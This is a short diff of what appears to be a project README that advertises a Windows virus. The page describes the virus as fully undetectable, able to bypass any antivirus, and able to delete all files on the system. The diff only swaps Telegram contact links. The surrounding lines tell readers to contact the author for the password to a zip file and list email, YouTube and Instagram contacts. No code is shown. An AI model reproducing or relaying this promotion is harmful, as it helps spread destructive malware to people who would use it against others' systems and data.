@@ -10,7 +10,7 @@ Virus for windows 100% FUD &amp; bypass any AV(Delete all files in windows &&& L
 Show full video on YouTube : Video was deleted by YouTube, I'll upload it again but for now you can get it from me on Telegram or Email
 Contact with me to get the Password of Zip file on :
 
- Telegram : https://t.me/erfan4lx5
+ Telegram : https://t.me/erfan4lx7
   
  Email : erfan4lx@gmail.com
 
@@ -18,7 +18,7 @@ Show demo video on Instagram : https://www.instagram.com/p/CL7jpLXA6c_/
 
 🆔My YouTube Channel : https://youtube.com/erfan4lx
 
-🆔My Telegram Channel : https://t.me/erfan4lx_company
+🆔My Telegram Channel : https://t.me/erfan4lx_marketing
 
 🆔My Instagram Page : https://www.instagram.com/_erfan4lx_/
 
